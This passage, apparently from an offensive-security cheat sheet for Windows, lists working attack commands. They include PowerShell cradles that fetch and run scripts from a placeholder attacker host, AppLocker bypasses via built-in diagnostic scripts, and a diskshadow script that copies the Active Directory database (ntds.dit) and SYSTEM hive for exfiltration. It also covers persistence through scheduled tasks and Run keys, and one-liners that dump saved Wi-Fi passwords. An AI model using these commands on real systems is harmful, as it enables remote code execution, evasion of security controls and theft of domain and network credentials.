        ~PS> $s=New-Object System.Xml.Xsl.XsltSettings;$r=New-Object System.Xml.XmlUrlResolver;$s.EnableScript=1;$x=New-Object System.Xml.Xsl.XslCompiledTransform;$x.Load('http://VAR_ATTACKER_HOST/xsl-notepad.xsl',$s,$r);$x.Transform('http://VAR_ATTACKER_HOST/xsl-notepad.xml','z');del z;

    ▒▒ SCT

        ░░ Powershell VBScript Assembly SCT "Fetch & Execute"

            ~PS> [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:http://VAR_ATTACKER_HOST/notepad.sct').Exec(0)

        ░░ Powershell JScript Assembly SCT "Fetch & Execute"

            ~PS> [Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');[Microsoft.JScript.Eval]::JScriptEvaluate('GetObject("script:http://VAR_ATTACKER_HOST/notepad.sct").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine())

    ▒▒ Loading .Net/C# Assemblies to Bypass AppLocker Default Rules w/ PowerShell Diagnostic Scripts

        ~> powershell -v 2 -ep bypass
        ~PS> cd C:\windows\diagnostics\system\AERO
        ~PS> import-module .\CL_LoadAssembly.ps1
        ~PS> LoadAssemblyFromPath ..\..\..\..\path\assembly.exe
        ~PS> [name.space]::executesomething()

    ▒▒ Command Invocation w/ PowerShell Diagnostic Scripts

        ~> powershell -v 2 -ep bypass
        ~PS> cd C:\windows\diagnostics\system\AERO
        ~PS> import-module CL_Invocation.ps1
        ~PS> SyncInvoke notepad.exe

    ▒▒ PowerShell CL Download Cradle

        ~PS> $a = New-Object System.Xml.XmlDocument
        ~PS> $a.Load("http://VAR_ATTACKER_HOST/notepad.xml")
        ~PS> $a.command.a.execute | iex

    ▒▒ diskshadow.exe

        ░░ Interactive

            ~> c:\windows\system32\diskshadow.exe
            > exec calc.exe
            > exec "cmd.exe" /c calc.exe
            > exit

        ░░ Script (diskshadow.txt)

            set context persistent nowriters
            add volume c: alias someAlias
            create
            expose %someAlias% z:
            exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit c:\exfil\ntds.dit
            exec "cmd.exe" /c reg.exe save hklm\system c:\exfil\system.bak
            delete shadows volume %someAlias%
            reset

        ░░ Execution

            ~> diskshadow.exe /s c:\test\diskshadow.txt

        ░░ Persistence

            ~> schtasks /create /sc hourly /tn VSSTask /tr "diskshadow.exe /s c:\test\diskshadow.txt"

            ~> reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v VSSRun /t REG_EXPAND_SZ /d "diskshadow.exe /s c:\test\diskshadow.txt"

██ Looting

    ▒▒ Wireless

        ░░ Wireless [Source: https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Credential_Access/Wifi_Passwords.txt]

            ~> powershell.exe netsh wlan show profiles|Select-String -Pattern " User Profile"|ForEach-Object{echo $_.Line.split(':')[1].trim()}|ForEach-Object{netsh wlan show profiles name=$_ key=clear}|Select-String -Pattern "Key Content|SSID name"

            # Windows 10
            ~> powershell.exe (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SID_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize

            # Windows 7 or PS Version 2.0
            ~> (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} |%{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches | % {$_.Groups[1].Value.Trim()}; $_} | %{[PSCustomObject]@{ SID_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize
